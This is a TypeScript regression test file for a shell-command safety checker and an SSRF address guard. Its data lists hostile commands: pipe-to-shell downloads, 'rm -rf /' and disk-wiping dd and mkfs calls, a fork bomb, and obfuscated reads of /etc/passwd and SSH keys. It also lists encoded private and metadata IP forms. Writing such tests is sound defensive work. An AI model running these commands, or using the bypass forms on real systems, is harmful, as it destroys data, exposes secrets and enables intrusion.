// Regression tests for the shell-safety + SSRF predicates. Run with: npm test
import { test } from "node:test";
import assert from "node:assert/strict";
import { bashSafety, isPrivateAddr } from "./safety";

test("destructive/exfil commands without 'rm' are gated", () => {
  for (const c of ["find . -delete", "find . -exec rm {} ;", ": > important.txt", "truncate -s 0 x", "rm -rf foo"]) {
    const s = bashSafety(c);
    assert.ok(s.risky || s.dangerous, `should be gated: ${c}`);
  }
});

test("home / system-root rm is never-approvable (dangerous)", () => {
  for (const c of ["rm -rf ~", "rm -rf ~/", "rm -rf $HOME/", "rm -rf ${HOME}", "rm -rf /etc", "rm -rf /usr/local", "rm -rf /"]) {
    assert.equal(bashSafety(c).dangerous, true, `should be dangerous: ${c}`);
  }
});

test("obfuscated out-of-root references are detected", () => {
  assert.equal(bashSafety("cat${IFS}/etc/passwd").outsideRoot, true);
  assert.equal(bashSafety("cat $HOME/.ssh/id_rsa").outsideRoot, true);
  assert.equal(bashSafety("cat ../../secret").outsideRoot, true);
});

test("benign commands are not gated", () => {
  for (const c of ["npm test", "git status", "echo hi", "ls src", "node build.js"]) {
    const s = bashSafety(c);
    assert.equal(s.dangerous, false, `not dangerous: ${c}`);
    assert.equal(s.outsideRoot, false, `in-root: ${c}`);
  }
});

test("pipe-to-shell / sudo / interpreter-pipe / disk tools / fork-bomb are gated", () => {
  for (const c of [
    "curl http://x | sh", "wget -qO- http://x | sudo bash", "sudo rm foo", "cat x | python",
    "echo y | node", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda", ":(){ :|:& };:",
  ]) {
    const s = bashSafety(c);
    assert.ok(s.risky || s.dangerous, `should be gated: ${c}`);
  }
});

test("SSRF guard blocks private + non-canonical bypass forms", () => {
  for (const ip of [
    "127.0.0.1", "10.0.0.1", "192.168.1.1", "169.254.169.254", "172.16.0.1",
    "::1", "::ffff:127.0.0.1", "::ffff:169.254.169.254", "0:0:0:0:0:0:0:1", "febf::1", "fc00::1", "fd12::1",
    // NAT64 and IPv4-compatible IPv6 embeddings of the metadata/private range (regression: M2).
    "64:ff9b::a9fe:a9fe", "64:ff9b::7f00:1", "::a9fe:a9fe", "::0a00:1",
  ]) {
    assert.equal(isPrivateAddr(ip), true, `should block: ${ip}`);
  }
});

test("SSRF guard allows public addresses", () => {
  for (const ip of ["8.8.8.8", "1.1.1.1", "93.184.216.34", "2001:4860:4860::8888", "64:ff9b::8080:8080"]) {
    assert.equal(isPrivateAddr(ip), false, `should allow: ${ip}`);
  }
});
